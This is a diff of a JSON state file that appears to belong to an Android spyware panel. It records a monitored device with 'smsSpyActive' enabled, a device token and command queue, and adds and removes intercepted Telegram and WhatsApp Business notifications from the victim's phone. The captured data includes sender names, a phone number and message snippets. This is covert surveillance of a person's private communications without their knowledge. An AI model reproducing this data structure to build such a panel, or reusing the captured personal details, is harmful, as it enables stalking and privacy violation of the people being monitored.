@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636936385,
+    "lastSeen": 1775636938165,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636938405
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636937388
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636937374
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636937325
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636937248
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636937233
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4278,54 +4326,6 @@
         "time": "08/04 14:35",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633731761
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Bantu connect panel apk bug",
-        "time": "08/04 14:35",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633731686
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:35",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633728420
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "🖼 https://youtu.be/6pc8sQ4sM_E?si=cOtsKq8VqcksD7R8\nhttps://youtu.be/6pc8sQ4sM_E?si=cOtsKq8VqcksD7R8\nhttps://youtu.be/6pc8sQ4sM_E?si=cOtsKq8VqcksD7R8\nhttps://youtu.be/6pc8sQ4sM_E?si=cOtsKq8VqcksD7R8",
-        "time": "08/04 14:35",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633728318
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "13 new messages from 13 chats",
-        "time": "08/04 14:35",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775633728296
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Lu?",
-        "time": "08/04 14:35",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633707412
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎4 pesan dari 3 chat",
-        "time": "08/04 14:35",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633707399
       }
     ],
     "galleryPhotos": [],
